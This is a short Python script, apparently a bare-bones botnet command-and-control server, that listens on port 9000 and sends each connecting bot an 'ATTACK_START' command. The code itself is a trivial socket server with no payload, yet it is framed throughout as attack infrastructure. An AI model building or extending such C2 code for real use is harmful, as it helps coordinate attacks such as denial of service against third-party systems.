import socket

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 9000  # Choose any unused port

# Create a TCP server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reusing the port
server.bind((HOST, PORT))
server.listen(5)

print(f"[+] Command & Control Server Listening on {HOST}:{PORT}")

while True:
    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    # Send attack command to bot
    client.send(b"ATTACK_START")  # Command to start the attack
    client.close()
